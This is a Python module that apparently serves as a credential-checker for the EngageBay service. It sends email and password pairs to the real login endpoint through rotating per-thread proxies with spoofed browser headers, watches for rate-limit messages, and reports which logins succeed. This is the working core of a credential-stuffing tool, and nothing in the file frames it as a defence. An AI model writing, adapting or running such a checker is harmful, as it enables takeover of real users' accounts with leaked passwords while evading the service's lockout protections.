"""
Checker for EngageBay – with rate-limit detection.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://app.engagebay.com"
LOGIN_URL = BASE_URL + "/rest/api/login/get-domain"
TIMEOUT = 15

# Known rate-limit messages
RATE_LIMIT_PHRASES = [
    "Login attempts limit reached",
    "too many attempts",
    "try again after",
]

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/login",
    })

    payload = {"email": email, "password": password}

    try:
        resp = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT)
        try:
            data = resp.json()
        except ValueError:
            # If the response is plain text, check for rate-limit or error
            text = resp.text.lower()
            for phrase in RATE_LIMIT_PHRASES:
                if phrase in resp.text.lower():
                    return False, f"Rate limited: {resp.text.strip()}"
            return False, f"Invalid JSON response: {resp.text[:100]}"

        # Check for error message in JSON
        if isinstance(data, dict):
            msg = data.get("message", "")
            if msg:
                for phrase in RATE_LIMIT_PHRASES:
                    if phrase.lower() in msg.lower():
                        return False, f"Rate limited: {msg}"
                if "incorrect" in msg.lower() or "invalid" in msg.lower():
                    return False, f"Login failed: {msg}"

            if data.get("status") == "success" or data.get("success") is True:
                return True, "Login successful"
            if "domain" in data:
                return True, f"Login successful (domain: {data['domain']})"

            # If no success but also no error, check content
            if "The username or password you entered is incorrect" in resp.text:
                return False, "Invalid credentials"
            # If we have a response and no error, assume success (cautious)
            return True, "Login successful (assumed)"
        else:
            return True, "Login successful"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"